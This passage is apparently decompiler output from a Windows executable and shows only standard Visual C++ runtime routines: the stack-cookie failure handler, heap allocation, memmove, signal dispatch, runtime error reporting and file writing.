BOOL __usercall sub_41553C@<eax>(
        int a1@<eax>,
        int a2@<edx>,
        int a3@<ecx>,
        int a4@<ebx>,
        int a5@<edi>,
        int a6@<esi>,
        char a7)
{
  unsigned int v7; // kr00_4
  HANDLE CurrentProcess; // eax
  int vars0; // [esp+328h] [ebp+0h]
  int retaddr; // [esp+32Ch] [ebp+4h]

  dword_425578 = a1;
  dword_425574 = a3;
  dword_425570 = a2;
  dword_42556C = a4;
  dword_425568 = a6;
  dword_425564 = a5;
  word_425590 = __SS__;
  word_425584 = __CS__;
  word_425560 = __DS__;
  word_42555C = __ES__;
  word_425558 = __FS__;
  word_425554 = __GS__;
  v7 = __readeflags();
  dword_425588 = v7;
  dword_42557C = vars0;
  dword_425580 = retaddr;
  dword_42558C = (int)&a7;
  dword_4254C8 = 65537;
  dword_42547C = retaddr;
  dword_425470 = -1073740791;
  dword_425474 = 1;
  dword_4254C0 = IsDebuggerPresent();
  sub_413E8F();
  SetUnhandledExceptionFilter(0);
  UnhandledExceptionFilter((struct _EXCEPTION_POINTERS *)&ExceptionInfo);
  if ( !dword_4254C0 )
    sub_413E8F();
  CurrentProcess = GetCurrentProcess();
  return TerminateProcess(CurrentProcess, 0xC0000409);
}
// 41559E: variable 'vars0' is possibly undefined
// 425470: using guessed type int dword_425470;
// 425474: using guessed type int dword_425474;
// 42547C: using guessed type int dword_42547C;
// 4254C0: using guessed type int dword_4254C0;
// 4254C8: using guessed type int dword_4254C8;
// 425554: using guessed type __int16 word_425554;
// 425558: using guessed type __int16 word_425558;
// 42555C: using guessed type __int16 word_42555C;
// 425560: using guessed type __int16 word_425560;
// 425564: using guessed type int dword_425564;
// 425568: using guessed type int dword_425568;
// 42556C: using guessed type int dword_42556C;
// 425570: using guessed type int dword_425570;
// 425574: using guessed type int dword_425574;
// 425578: using guessed type int dword_425578;
// 42557C: using guessed type int dword_42557C;
// 425580: using guessed type int dword_425580;
// 425584: using guessed type __int16 word_425584;
// 425588: using guessed type int dword_425588;
// 42558C: using guessed type int dword_42558C;
// 425590: using guessed type __int16 word_425590;

//----- (004156FC) --------------------------------------------------------
int sub_4156FC()
{
  dword_429DF4 = IsProcessorFeaturePresent(0xAu);
  return 0;
}
// 429DF4: using guessed type int dword_429DF4;

//----- (0041573D) --------------------------------------------------------
LPVOID __usercall sub_41573D@<eax>(LPVOID a1@<edi>, SIZE_T dwBytes)
{
  SIZE_T v2; // eax
  int v3; // ecx
  BOOL v4; // eax
  int v5; // ecx
  int v7; // [esp-Ch] [ebp-10h]
  int v8; // [esp-4h] [ebp-8h]

  if ( dwBytes > 0xFFFFFFE0 )
  {
    sub_415ED1(dwBytes);
    *(_DWORD *)sub_413A1F(v8) = 12;
    return 0;
  }
  else
  {
    while ( 1 )
    {
      if ( !hHeap )
      {
        sub_4160FF((int)a1);
        sub_415F50(30);
        sub_4141FB(0xFFu);
      }
      v2 = dwBytes ? dwBytes : 1;
      a1 = HeapAlloc(hHeap, 0, v2);
      if ( a1 )
        return a1;
      if ( !dword_425DF8 )
      {
        *(_DWORD *)sub_413A1F(v3) = 12;
LABEL_12:
        *(_DWORD *)sub_413A1F(v5) = 12;
        return a1;
      }
      v4 = sub_415ED1(dwBytes);
      v5 = v7;
      if ( !v4 )
        goto LABEL_12;
    }
  }
}
// 41579F: variable 'v7' is possibly undefined
// 4157A6: variable 'v3' is possibly undefined
// 4157AD: variable 'v5' is possibly undefined
// 4157C1: variable 'v8' is possibly undefined
// 413A1F: using guessed type int __fastcall sub_413A1F(_DWORD);
// 425DF8: using guessed type int dword_425DF8;

//----- (004157D1) --------------------------------------------------------
LPVOID __cdecl sub_4157D1(unsigned int a1, unsigned int a2, _DWORD *a3)
{
  LPVOID result; // eax
  unsigned int v4; // esi

  if ( a1 && 0xFFFFFFE0 / a1 < a2 )
  {
    *(_DWORD *)sub_413A1F() = 12;
    return 0;
  }
  else
  {
    v4 = a2 * a1;
    if ( !(a2 * a1) )
      v4 = 1;
    while ( 1 )
    {
      result = 0;
      if ( v4 <= 0xFFFFFFE0 )
      {
        result = HeapAlloc(hHeap, 8u, v4);
        if ( result )
          break;
      }
      if ( !dword_425DF8 )
      {
        if ( a3 )
          *a3 = 12;
        return result;
      }
      if ( !sub_415ED1(v4) )
      {
        if ( a3 )
          *a3 = 12;
        return 0;
      }
    }
  }
  return result;
}
// 413A1F: using guessed type int sub_413A1F(void);
// 425DF8: using guessed type int dword_425DF8;

//----- (00415930) --------------------------------------------------------
unsigned int __cdecl sub_415930(unsigned int a1, const __m128i *a2, unsigned int a3)
{
  const __m128i *v3; // esi
  unsigned int v4; // ecx
  __m128i *v5; // edi
  unsigned int v6; // ecx
  unsigned int result; // eax
  int v8; // esi
  int v9; // edi
  unsigned int v10; // ecx
  int v11; // eax
  unsigned int v12; // edx
  unsigned int v13; // ecx
  unsigned int j; // edx
  __m128i si128; // xmm1
  __m128i v16; // xmm2
  __m128i v17; // xmm3
  __m128i v18; // xmm5
  __m128i v19; // xmm6
  __m128i v20; // xmm7
  unsigned int k; // edx
  unsigned int v22; // ecx
  char v23; // al
  unsigned int m; // ecx
  int v25; // ecx
  unsigned int v26; // eax
  int v27; // ecx
  unsigned int i; // eax
  unsigned int v29; // [esp-8h] [ebp-10h]

  v3 = a2;
  v4 = a3;
  v5 = (__m128i *)a1;
  if ( a1 > (unsigned int)a2 && a1 < (unsigned int)a2->m128i_u32 + a3 )
  {
    v8 = (int)&a2->m128i_i32[-1] + a3;
    v9 = a3 + a1 - 4;
    if ( (v9 & 3) == 0 )
    {
      v10 = a3 >> 2;
      if ( a3 >> 2 >= 8 )
      {
        while ( v10 )
        {
          *(_DWORD *)v9 = *(_DWORD *)v8;
          v8 -= 4;
          v9 -= 4;
          --v10;
        }
        switch ( a3 & 3 )
        {
          case 0u:
            goto LABEL_35;
          case 1u:
            goto LABEL_36;
          case 2u:
            goto LABEL_37;
          case 3u:
            goto LABEL_38;
        }
      }
      switch ( a3 & 3 )
      {
        case 0u:
          goto LABEL_35;
        case 1u:
          goto LABEL_36;
        case 2u:
          goto LABEL_37;
        case 3u:
          goto LABEL_38;
      }
    }
    switch ( a3 )
    {
      case 0u:
LABEL_35:
        result = a1;
        break;
      case 1u:
LABEL_36:
        *(_BYTE *)(v9 + 3) = *(_BYTE *)(v8 + 3);
        result = a1;
        break;
      case 2u:
LABEL_37:
        *(_BYTE *)(v9 + 3) = *(_BYTE *)(v8 + 3);
        *(_BYTE *)(v9 + 2) = *(_BYTE *)(v8 + 2);
        result = a1;
        break;
      case 3u:
LABEL_38:
        *(_BYTE *)(v9 + 3) = *(_BYTE *)(v8 + 3);
        *(_BYTE *)(v9 + 2) = *(_BYTE *)(v8 + 2);
        *(_BYTE *)(v9 + 1) = *(_BYTE *)(v8 + 1);
        result = a1;
        break;
      default:
        __asm { jmp     dword ptr ds:(loc_415B3C+4)[eax*4] }
        return result;
    }
  }
  else if ( a3 >= 0x80 && dword_429DF4 && (v3 = a2, v5 = (__m128i *)a1, (a1 & 0xF) == ((unsigned __int8)a2 & 0xF)) )
  {
    v11 = (unsigned __int8)a2 & 0xF;
    if ( ((unsigned __int8)a2 & 0xF) != 0 )
    {
      v29 = a3 - (16 - v11);
      v26 = 16 - v11;
      v27 = v26 & 3;
      if ( (v26 & 3) != 0 )
      {
        do
        {
          v5->m128i_i8[0] = v3->m128i_i8[0];
          v3 = (const __m128i *)((char *)v3 + 1);
          v5 = (__m128i *)((char *)v5 + 1);
          --v27;
        }
        while ( v27 );
      }
      for ( i = v26 >> 2; i; --i )
      {
        v5->m128i_i32[0] = v3->m128i_i32[0];
        v3 = (const __m128i *)((char *)v3 + 4);
        v5 = (__m128i *)((char *)v5 + 4);
      }
      v4 = v29;
    }
    v12 = v4;
    v13 = v4 & 0x7F;
    for ( j = v12 >> 7; j; --j )
    {
      si128 = _mm_load_si128(v3 + 1);
      v16 = _mm_load_si128(v3 + 2);
      v17 = _mm_load_si128(v3 + 3);
      *v5 = _mm_load_si128(v3);
      v5[1] = si128;
      v5[2] = v16;
      v5[3] = v17;
      v18 = _mm_load_si128(v3 + 5);
      v19 = _mm_load_si128(v3 + 6);
      v20 = _mm_load_si128(v3 + 7);
      v5[4] = _mm_load_si128(v3 + 4);
      v5[5] = v18;
      v5[6] = v19;
      v5[7] = v20;
      v3 += 8;
      v5 += 8;
    }
    if ( v13 )
    {
      for ( k = v13 >> 4; k; --k )
        *v5++ = _mm_load_si128(v3++);
      v22 = v13 & 0xF;
      if ( v22 )
      {
        v23 = v22;
        for ( m = v22 >> 2; m; --m )
        {
          v5->m128i_i32[0] = v3->m128i_i32[0];
          v3 = (const __m128i *)((char *)v3 + 4);
          v5 = (__m128i *)((char *)v5 + 4);
        }
        v25 = v23 & 3;
        if ( (v23 & 3) != 0 )
        {
          do
          {
            v5->m128i_i8[0] = v3->m128i_i8[0];
            v3 = (const __m128i *)((char *)v3 + 1);
            v5 = (__m128i *)((char *)v5 + 1);
            --v25;
          }
          while ( v25 );
        }
      }
    }
    return a1;
  }
  else
  {
    if ( ((unsigned __int8)v5 & 3) != 0 )
    {
      if ( a3 >= 4 )
        __asm { jmp     dword ptr ds:(loc_4159B0+4)[eax*4] }
      __asm { jmp     dword ptr ds:loc_415AB0[ecx*4]; jumptable 00415989 case 0 }
    }
    v6 = a3 >> 2;
    switch ( v6 )
    {
      case 0u:
        goto LABEL_20;
      case 1u:
        goto LABEL_19;
      case 2u:
        goto LABEL_18;
      case 3u:
        goto LABEL_17;
      case 4u:
        goto LABEL_16;
      case 5u:
        goto LABEL_15;
      case 6u:
        goto LABEL_14;
      case 7u:
        *((_DWORD *)&v5[-1] + v6 - 3) = *((_DWORD *)&v3[-1] + v6 - 3);
LABEL_14:
        *((_DWORD *)&v5[-1] + v6 - 2) = *((_DWORD *)&v3[-1] + v6 - 2);
LABEL_15:
        *((_DWORD *)&v5[-1] + v6 - 1) = *((_DWORD *)&v3[-1] + v6 - 1);
LABEL_16:
        v5[-1].m128i_i32[v6] = v3[-1].m128i_i32[v6];
LABEL_17:
        v5->m128i_i32[v6 - 3] = v3->m128i_i32[v6 - 3];
LABEL_18:
        v5->m128i_i32[v6 - 2] = v3->m128i_i32[v6 - 2];
LABEL_19:
        v5->m128i_i32[v6 - 1] = v3->m128i_i32[v6 - 1];
        v3 = (const __m128i *)((char *)v3 + 4 * v6);
        v5 = (__m128i *)((char *)v5 + 4 * v6);
LABEL_20:
        switch ( a3 & 3 )
        {
          case 0u:
            goto LABEL_21;
          case 1u:
            goto LABEL_22;
          case 2u:
            goto LABEL_23;
          case 3u:
            goto LABEL_24;
        }
      default:
        qmemcpy(v5, v3, 4 * v6);
        v3 = (const __m128i *)((char *)v3 + 4 * v6);
        v5 = (__m128i *)((char *)v5 + 4 * v6);
        switch ( a3 & 3 )
        {
          case 0u:
LABEL_21:
            result = a1;
            break;
          case 1u:
LABEL_22:
            v5->m128i_i8[0] = v3->m128i_i8[0];
            result = a1;
            break;
          case 2u:
LABEL_23:
            v5->m128i_i8[0] = v3->m128i_i8[0];
            v5->m128i_i8[1] = v3->m128i_i8[1];
            result = a1;
            break;
          case 3u:
LABEL_24:
            v5->m128i_i8[0] = v3->m128i_i8[0];
            v5->m128i_i8[1] = v3->m128i_i8[1];
            v5->m128i_i8[2] = v3->m128i_i8[2];
            result = a1;
            break;
        }
        break;
    }
  }
  return result;
}
// 429DF4: using guessed type int dword_429DF4;

//----- (00415C91) --------------------------------------------------------
void __cdecl sub_415C91(int a1)
{
  if ( a1 )
  {
    if ( *(_DWORD *)(a1 - 8) == 56797 )
      sub_4139A3((LPVOID)(a1 - 8));
  }
}

//----- (00415CB1) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall __noreturn sub_415CB1(int a1@<edi>, int a2@<esi>)
{
  void (*v2)(void); // eax

  v2 = (void (*)(void))sub_4141B6(a1)[30];
  if ( v2 )
    v2();
  sub_41764C(a1, a2);
}
// 415CE9: positive sp value 2C has been found

//----- (00415CEA) --------------------------------------------------------
unsigned int __usercall sub_415CEA@<eax>(int a1@<edx>, unsigned int a2)
{
  unsigned int result; // eax

  result = a2;
  do
  {
    if ( *(_DWORD *)(result + 4) == a1 )
      break;
    result += 12;
  }
  while ( result < a2 + 144 );
  if ( result >= a2 + 144 || *(_DWORD *)(result + 4) != a1 )
    return 0;
  return result;
}

//----- (00415D21) --------------------------------------------------------
PVOID sub_415D21()
{
  return DecodePointer(dword_4257AC);
}

//----- (00415D2E) --------------------------------------------------------
int __cdecl sub_415D2E(int a1)
{
  DWORD *v1; // edi
  DWORD *v2; // eax
  int result; // eax
  int *v4; // esi
  PVOID v5; // eax
  void (__cdecl *v6)(int, DWORD); // eax
  DWORD v7; // [esp+10h] [ebp-30h]
  DWORD v8; // [esp+14h] [ebp-2Ch]
  int i; // [esp+1Ch] [ebp-24h]
  void (__cdecl *v10)(int, DWORD); // [esp+20h] [ebp-20h]
  int v11; // [esp+24h] [ebp-1Ch]

  v1 = 0;
  v11 = 0;
  if ( a1 > 11 )
  {
    if ( a1 == 15 )
    {
      v4 = &dword_4257B0;
      v5 = (PVOID)dword_4257B0;
      goto LABEL_18;
    }
    if ( a1 == 21 )
    {
      v4 = &dword_4257A8;
      v5 = (PVOID)dword_4257A8;
      goto LABEL_18;
    }
    if ( a1 != 22 )
      goto LABEL_14;
    goto LABEL_15;
  }
  if ( a1 != 11 )
  {
    if ( a1 == 2 )
    {
      v4 = (int *)&dword_4257A4;
      v5 = dword_4257A4;
LABEL_18:
      v11 = 1;
      v6 = (void (__cdecl *)(int, DWORD))DecodePointer(v5);
      goto LABEL_19;
    }
    if ( a1 != 4 )
    {
      if ( a1 != 6 )
      {
        if ( a1 == 8 )
          goto LABEL_7;
LABEL_14:
        *sub_413A1F() = 22;
        sub_413993(0);
        return -1;
      }
LABEL_15:
      v4 = (int *)&dword_4257AC;
      v5 = dword_4257AC;
      goto LABEL_18;
    }
  }
LABEL_7:
  v2 = sub_41413D();
  v1 = v2;
  if ( !v2 )
    return -1;
  v4 = (int *)(sub_415CEA(a1, v2[23]) + 8);
  v6 = (void (__cdecl *)(int, DWORD))*v4;
LABEL_19:
  v10 = v6;
  result = 0;
  if ( v10 == (void (__cdecl *)(int, DWORD))1 )
    return result;
  if ( !v10 )
    sub_414353(3u);
  if ( v11 != result )
    sub_4144A0((int)v1, result);
  if ( a1 == 8 || a1 == 11 || a1 == 4 )
  {
    v8 = v1[24];
    v1[24] = 0;
    if ( a1 != 8 )
      goto LABEL_33;
    v7 = v1[25];
    v1[25] = 140;
  }
  if ( a1 == 8 )
  {
    for ( i = 3; i < 12; ++i )
      *(_DWORD *)(12 * i + v1[23] + 8) = 0;
    goto LABEL_37;
  }
LABEL_33:
  *v4 = (int)sub_41404C();
LABEL_37:
  if ( v11 )
    sub_4143C7(0);
  if ( a1 == 8 )
    v10(8, v1[25]);
  else
    ((void (__cdecl *)(int))v10)(a1);
  if ( a1 == 8 || a1 == 11 || a1 == 4 )
  {
    v1[24] = v8;
    if ( a1 == 8 )
      v1[25] = v7;
  }
  return 0;
}
// 415E04: variable 'result' is possibly undefined
// 415EBB: variable 'v8' is possibly undefined
// 415EC6: variable 'v7' is possibly undefined
// 4257A8: using guessed type int dword_4257A8;
// 4257B0: using guessed type int dword_4257B0;

//----- (00415ED1) --------------------------------------------------------
BOOL __cdecl sub_415ED1(int a1)
{
  int (__cdecl *v1)(int); // eax

  v1 = (int (__cdecl *)(int))DecodePointer(dword_4257C0);
  return v1 && v1(a1);
}

//----- (00415EF9) --------------------------------------------------------
int sub_415EF9()
{
  _DWORD *v0; // esi

  v0 = sub_414000(0x20u, 4u);
  dword_429F04 = EncodePointer(v0);
  dword_429F00 = dword_429F04;
  if ( !v0 )
    return 24;
  *v0 = 0;
  return 0;
}

//----- (00415F2A) --------------------------------------------------------
wchar_t *__cdecl sub_415F2A(int a1)
{
  int v1; // eax

  v1 = 0;
  while ( a1 != dword_41A0B0[2 * v1] )
  {
    if ( (unsigned int)++v1 >= 0x16 )
      return 0;
  }
  return (&off_41A0B4)[2 * v1];
}
// 41A0B0: using guessed type int dword_41A0B0[];
// 41A0B4: using guessed type wchar_t *off_41A0B4;

//----- (00415F50) --------------------------------------------------------
void *__cdecl sub_415F50(int a1)
{
  int v1; // esi
  void *result; // eax
  int v3; // edi
  int v4; // ebx
  int v5; // ecx
  int v6; // eax
  __int16 *v7; // ecx
  _WORD *v8; // eax
  int v9; // ecx
  __int16 *v10; // ecx
  void *v11; // esi
  unsigned int i; // eax
  char *v13; // eax
  __int16 *v14; // [esp-18h] [ebp-220h]
  int v15; // [esp-4h] [ebp-20Ch]
  DWORD NumberOfBytesWritten; // [esp+Ch] [ebp-1FCh] BYREF
  _DWORD Buffer[124]; // [esp+10h] [ebp-1F8h] BYREF
  char v18; // [esp+203h] [ebp-5h]

  v1 = a1;
  result = sub_415F2A(a1);
  v3 = (int)result;
  v4 = 0;
  NumberOfBytesWritten = (DWORD)result;
  if ( result )
  {
    if ( sub_4179AB((int)result, 3) == 1 || (result = (void *)sub_4179AB(v3, 3)) == 0 && dword_423D80 == 1 )
    {
      result = GetStdHandle(0xFFFFFFF4);
      v11 = result;
      if ( result && result != (void *)-1 )
      {
        for ( i = 0; i < 0x1F4; ++i )
        {
          *((_BYTE *)Buffer + i) = *(_BYTE *)(v3 + 2 * i);
          if ( !*(_WORD *)(v3 + 2 * i) )
            break;
        }
        v18 = 0;
        v13 = sub_413F30(Buffer);
        return (void *)WriteFile(v11, Buffer, (DWORD)v13, &NumberOfBytesWritten, 0);
      }
    }
    else if ( a1 != 252 )
    {
      if ( !sub_417948(v15, (int)byte_4257C8, byte_4257C8, 788, (char *)L"Runtime Error!\n\nProgram: ") )
      {
        v1 = (int)Filename;
        word_425A02 = 0;
        v4 = 763;
        if ( GetModuleFileNameW(0, Filename, 0x104u)
          || !sub_417948(v5, (int)byte_4257C8, (char *)Filename, 763, (char *)L"<program name unknown>") )
        {
          goto LABEL_10;
        }
      }
      while ( 1 )
      {
        sub_413941((int)byte_4257C8);
LABEL_10:
        v6 = sub_41792D((_WORD *)v1);
        v7 = v14;
        if ( (unsigned int)(v6 + 1) > 0x3C )
        {
          v8 = (_WORD *)((char *)&unk_425784 + 2 * sub_41792D((_WORD *)v1));
          v9 = ((int)v8 - v1) >> 1;
          v4 -= v9;
          if ( sub_417860((__int16 *)v9, (int)byte_4257C8, v8, v4, L"...", 3) )
            continue;
        }
        v1 = 788;
        if ( !sub_4177EB(v7, (int)byte_4257C8, byte_4257C8, 788, L"\n\n")
          && !sub_4177EB(v10, (int)byte_4257C8, byte_4257C8, 788, (__int16 *)NumberOfBytesWritten) )
        {
          break;
        }
      }
      return (void *)sub_41767F((int)byte_4257C8, (int)L"Microsoft Visual C++ Runtime Library", 73744);
    }
  }
  return result;
}
// 415FCA: variable 'v15' is possibly undefined
// 416002: variable 'v5' is possibly undefined
// 416021: variable 'v14' is possibly undefined
// 41605D: variable 'v7' is possibly undefined
// 416071: variable 'v10' is possibly undefined
// 41A160: using guessed type wchar_t aMicrosoftVisua[37];
// 41A1AC: using guessed type wchar_t asc_41A1AC[3];
// 41A1B4: using guessed type wchar_t asc_41A1B4[4];
// 41A1BC: using guessed type wchar_t aProgramNameUnk[23];
// 41A1EC: using guessed type wchar_t aRuntimeErrorPr[26];
// 423D80: using guessed type int dword_423D80;
// 4257FA: using guessed type WCHAR Filename[260];
// 425A02: using guessed type __int16 word_425A02;

//----- (004160FF) --------------------------------------------------------
void *__usercall sub_4160FF@<eax>(int a1@<edi>)
{
  void *result; // eax

  if ( sub_4179AB(a1, 3) == 1 || (result = (void *)sub_4179AB(a1, 3)) == 0 && dword_423D80 == 1 )
  {
    sub_415F50(252);
    return sub_415F50(255);
  }
  return result;
}
// 423D80: using guessed type int dword_423D80;

//----- (00416138) --------------------------------------------------------
int __cdecl sub_416138(int a1)
{
  int v1; // edi
  int v3; // eax

  v1 = -1;
  if ( a1 )
  {
    if ( (*(_BYTE *)(a1 + 12) & 0x83) != 0 )
    {
      v1 = sub_41456F((_DWORD *)a1);
      sub_417B4A(a1);
      v3 = sub_414758(v1, a1);
      if ( sub_417A86((int *)v1, v3) >= 0 )
      {
        if ( *(_DWORD *)(a1 + 28) )
        {
          sub_4139A3(*(LPVOID *)(a1 + 28));
          *(_DWORD *)(a1 + 28) = 0;
        }
      }
      else
      {
        v1 = -1;
      }
    }
    *(_DWORD *)(a1 + 12) = 0;
    return v1;
  }
  else
  {
    *sub_413A1F() = 22;
    sub_413993(-1);
    return -1;
  }
}

//----- (004161A5) --------------------------------------------------------
int __usercall sub_4161A5@<eax>(int a1@<edi>, unsigned int a2)
{
  int v3; // [esp+10h] [ebp-1Ch]

  v3 = -1;
  if ( a2 )
  {
    if ( (*(_BYTE *)(a2 + 12) & 0x40) != 0 )
    {
      *(_DWORD *)(a2 + 12) = 0;
    }
    else
    {
      sub_413B39(a1, a2);
      v3 = sub_416138(a2);
      sub_413BAC(a2);
    }
    return v3;
  }
  else
  {
    *sub_413A1F() = 22;
    sub_413993(a1);
    return -1;
  }
}

//----- (00416219) --------------------------------------------------------
int __cdecl sub_416219(int a1, const void *a2, DWORD nNumberOfBytesToWrite)
{
  int *v4; // ebx
  int v5; // eax
  int v6; // edi
  char v7; // cl
  BOOL v8; // esi
  DWORD ConsoleCP; // eax
  const CHAR *v10; // ebx
  unsigned __int8 v11; // cl
  int *v12; // esi
  int v13; // eax
  int v14; // eax
  int v15; // eax
  signed int v16; // esi
  int v17; // eax
  int v18; // esi
  int v19; // ecx
  CHAR v20; // dl
  char *v21; // ebx
  unsigned int v22; // esi
  DWORD v23; // ecx
  char *v24; // eax
  char v25; // dl
  signed int v26; // esi
  char *v27; // ebx
  DWORD v28; // ecx
  char *v29; // eax
  int v30; // edx
  signed int v31; // esi
  DWORD v32; // ecx
  WCHAR *v33; // eax
  int v34; // edx
  int v35; // esi
  int v36; // ebx
  BOOL v37; // [esp+8h] [ebp-1AE4h]
  DWORD Mode; // [esp+Ch] [ebp-1AE0h] BYREF
  int *v39; // [esp+10h] [ebp-1ADCh]
  DWORD v40; // [esp+14h] [ebp-1AD8h] BYREF
  DWORD NumberOfBytesWritten; // [esp+18h] [ebp-1AD4h] BYREF
  int v42; // [esp+1Ch] [ebp-1AD0h]
  LPCVOID lpBuffer; // [esp+20h] [ebp-1ACCh]
  DWORD v44; // [esp+24h] [ebp-1AC8h]
  char v45; // [esp+2Bh] [ebp-1AC1h]
  unsigned int v46; // [esp+2Ch] [ebp-1AC0h]
  WCHAR WideCharStr[2]; // [esp+30h] [ebp-1ABCh] BYREF
  char Buffer[1704]; // [esp+34h] [ebp-1AB8h] BYREF
  CHAR v49[3416]; // [esp+6DCh] [ebp-1410h] BYREF
  WCHAR v50[854]; // [esp+1434h] [ebp-6B8h] BYREF
  CHAR MultiByteStr[8]; // [esp+1AE0h] [ebp-Ch] BYREF

  lpBuffer = a2;
  v44 = 0;
  v42 = 0;
  if ( !nNumberOfBytesToWrite )
    return 0;
  if ( !a2 )
  {
    *sub_413A32() = 0;
    *sub_413A1F() = 22;
    sub_413993(0);
    return -1;
  }
  v4 = &dword_429E00[a1 >> 5];
  v5 = *v4;
  v6 = (a1 & 0x1F) << 6;
  v7 = (char)(2 * *(_BYTE *)(*v4 + v6 + 36)) >> 1;
  v39 = v4;
  v45 = v7;
  if ( (v7 == 2 || v7 == 1) && (nNumberOfBytesToWrite & 1) != 0 )
  {
    *sub_413A32() = 0;
    *sub_413A1F() = 22;
    sub_413993(v6);
    return -1;
  }
  if ( (*(_BYTE *)(v5 + v6 + 4) & 0x20) != 0 )
    sub_4172F5(v6, a1, 0, 0, 2u);
  if ( sub_414702(v6, a1) )
  {
    if ( *(char *)(v6 + *v4 + 4) < 0 )
    {
      v8 = *(_DWORD *)(sub_4141B6(v6)[27] + 20) == 0;
      if ( GetConsoleMode(*(HANDLE *)(v6 + *v4), &Mode) )
      {
        if ( !v8 || v45 )
        {
          ConsoleCP = GetConsoleCP();
          v10 = (const CHAR *)lpBuffer;
          Mode = ConsoleCP;
          NumberOfBytesWritten = 0;
          v46 = 0;
          while ( 1 )
          {
            if ( v45 )
            {
              if ( v45 == 1 || v45 == 2 )
              {
                v18 = *(unsigned __int16 *)v10;
                v10 += 2;
                v46 += 2;
                *(_DWORD *)WideCharStr = v18;
                v37 = v18 == 10;
              }
              if ( v45 == 1 || v45 == 2 )
              {
                if ( sub_417B7B(WideCharStr[0]) != WideCharStr[0] )
                  goto LABEL_85;
                v44 += 2;
                if ( v37 )
                {
                  wcscpy(WideCharStr, L"\r");
                  if ( sub_417B7B(13) != WideCharStr[0] )
                    goto LABEL_85;
                  ++v44;
                  ++v42;
                }
              }
              goto LABEL_43;
            }
            v11 = *v10;
            v12 = v39;
            v37 = *v10 == 10;
            v13 = v6 + *v39;
            if ( *(_DWORD *)(v13 + 56) )
            {
              MultiByteStr[0] = *(_BYTE *)(v13 + 52);
              MultiByteStr[1] = v11;
              *(_DWORD *)(v13 + 56) = 0;
              v14 = sub_417CD3(v6, WideCharStr, MultiByteStr, 2);
            }
            else
            {
              if ( sub_4151D3(v6, v11) )
              {
                if ( nNumberOfBytesToWrite + (_BYTE *)lpBuffer - v10 <= 1 )
                {
                  v19 = *v12;
                  v20 = *v10;
                  ++v44;
                  *(_BYTE *)(v6 + v19 + 52) = v20;
                  *(_DWORD *)(v6 + *v12 + 56) = 1;
                  goto LABEL_86;
                }
                if ( sub_417CD3(v6, WideCharStr, v10, 2) == -1 )
                  goto LABEL_86;
                ++v10;
                ++v46;
                goto LABEL_27;
              }
              v14 = sub_417CD3(v6, WideCharStr, v10, 1);
            }
            if ( v14 == -1 )
              goto LABEL_86;
LABEL_27:
            ++v10;
            ++v46;
            v15 = WideCharToMultiByte(Mode, 0, WideCharStr, 1, MultiByteStr, 5, 0, 0);
            v16 = v15;
            if ( !v15 )
              goto LABEL_86;
            if ( !WriteFile(*(HANDLE *)(v6 + *v39), MultiByteStr, v15, &NumberOfBytesWritten, 0) )
              goto LABEL_85;
            v44 = v42 + v46;
            if ( (int)NumberOfBytesWritten < v16 )
              goto LABEL_86;
            if ( v37 )
            {
              v17 = *v39;
              MultiByteStr[0] = 13;
              if ( !WriteFile(*(HANDLE *)(v6 + v17), MultiByteStr, 1u, &NumberOfBytesWritten, 0) )
                goto LABEL_85;
              if ( (int)NumberOfBytesWritten < 1 )
                goto LABEL_86;
              ++v42;
              ++v44;
            }
LABEL_43:
            if ( v46 >= nNumberOfBytesToWrite )
              goto LABEL_86;
          }
        }
      }
    }
  }
  if ( *(char *)(*v4 + v6 + 4) >= 0 )
  {
    if ( WriteFile(*(HANDLE *)(*v4 + ((a1 & 0x1F) << 6)), lpBuffer, nNumberOfBytesToWrite, &v40, 0) )
    {
      *(_DWORD *)WideCharStr = 0;
      v44 = v40;
      goto LABEL_86;
    }
  }
  else
  {
    *(_DWORD *)WideCharStr = 0;
    if ( v45 )
    {
      if ( v45 == 2 )
      {
        v27 = (char *)lpBuffer;
        while ( 1 )
        {
          v46 = 0;
          v28 = v27 - (_BYTE *)lpBuffer;
          v29 = Buffer;
          do
          {
            if ( v28 >= nNumberOfBytesToWrite )
              break;
            v30 = *(unsigned __int16 *)v27;
            v27 += 2;
            v28 += 2;
            Mode = (DWORD)v27;
            if ( v30 == 10 )
            {
              v42 += 2;
              *(_WORD *)v29 = 13;
              v27 = (char *)Mode;
              v29 += 2;
              v46 += 2;
            }
            v46 += 2;
            *(_WORD *)v29 = v30;
            v29 += 2;
          }
          while ( v46 < 0x13FE );
          v31 = v29 - Buffer;
          if ( !WriteFile(*(HANDLE *)(v6 + *v39), Buffer, v29 - Buffer, &v40, 0) )
            break;
          v44 += v40;
          if ( (int)v40 < v31 || v27 - (_BYTE *)lpBuffer >= nNumberOfBytesToWrite )
            goto LABEL_86;
        }
      }
      else
      {
        NumberOfBytesWritten = (DWORD)lpBuffer;
        while ( 1 )
        {
          v46 = 0;
          v32 = NumberOfBytesWritten - (_DWORD)lpBuffer;
          v33 = v50;
          do
          {
            if ( v32 >= nNumberOfBytesToWrite )
              break;
            v34 = *(unsigned __int16 *)NumberOfBytesWritten;
            NumberOfBytesWritten += 2;
            v32 += 2;
            if ( v34 == 10 )
            {
              *v33++ = 13;
              v46 += 2;
            }
            v46 += 2;
            *v33++ = v34;
          }
          while ( v46 < 0x6A8 );
          v35 = 0;
          v36 = WideCharToMultiByte(0xFDE9u, 0, v50, v33 - v50, v49, 3413, 0, 0);
          if ( !v36 )
            break;
          while ( WriteFile(*(HANDLE *)(v6 + *v39), &v49[v35], v36 - v35, &v40, 0) )
          {
            v35 += v40;
            if ( v36 <= v35 )
              goto LABEL_80;
          }
          *(_DWORD *)WideCharStr = GetLastError();
LABEL_80:
          if ( v36 <= v35 )
          {
            v44 = NumberOfBytesWritten - (_DWORD)lpBuffer;
            if ( NumberOfBytesWritten - (unsigned int)lpBuffer < nNumberOfBytesToWrite )
              continue;
          }
          goto LABEL_86;
        }
      }
    }
    else
    {
      v21 = (char *)lpBuffer;
      while ( 1 )
      {
        v22 = 0;
        v23 = v21 - (_BYTE *)lpBuffer;
        v24 = Buffer;
        do
        {
          if ( v23 >= nNumberOfBytesToWrite )
            break;
          v25 = *v21++;
          ++v23;
          Mode = (DWORD)v21;
          if ( v25 == 10 )
          {
            ++v42;
            *v24++ = 13;
            ++v22;
          }
          *v24++ = v25;
          ++v22;
        }
        while ( v22 < 0x13FF );
        v26 = v24 - Buffer;
        if ( !WriteFile(*(HANDLE *)(v6 + *v39), Buffer, v24 - Buffer, &v40, 0) )
          break;
        v44 += v40;
